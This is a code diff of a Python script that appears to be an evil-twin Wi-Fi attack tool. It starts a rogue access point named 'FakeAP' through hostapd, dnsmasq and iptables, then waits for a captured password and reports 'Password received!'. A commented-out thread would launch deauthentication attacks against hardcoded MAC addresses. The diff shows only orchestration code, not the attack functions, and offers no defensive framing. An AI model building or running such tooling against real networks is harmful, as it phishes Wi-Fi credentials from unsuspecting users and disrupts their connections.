@@ -2,11 +2,13 @@ import os
 from scapy.all import get_if_list
 from prompt_toolkit import prompt
 from rich.console import Console
+from attack import deauth
 from utils import *
 from pyfiglet import figlet_format
 from termcolor import cprint
 import subprocess
 import shlex
+import threading
 
 
 def count_file_chars():
@@ -31,7 +33,7 @@ def start_dnsmasq():
 
 
     while current_count == count_file_chars():
-        console.print(f'[bold][yellow].[/][/]')
+        console.print(f'[bold][yellow].\r[/][/]')
         time.sleep(1)
 
     console.print(f'[bold][green]Password received![/][/]')
@@ -51,7 +53,7 @@ attack_inet = None
 internet_inet = None
 
 # TODO
-ssid = None
+ssid = "FakeAP"
 
 while 1:
     user_input = main_menu_io()
@@ -73,6 +75,8 @@ while 1:
         set_iptables(attack_inet, internet_inet)
         set_hostapd_conf(attack_inet, ssid, 11)
         ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))
+        # deauth_th = threading.Thread(target=deauth, args=('26:18:1D:7C:7A:EB','2E:E4:F0:11:48:B5', "wlan9", 1))
+        # deauth_th.start()
         start_dnsmasq()
         """
         here we need to print the password and stop!!
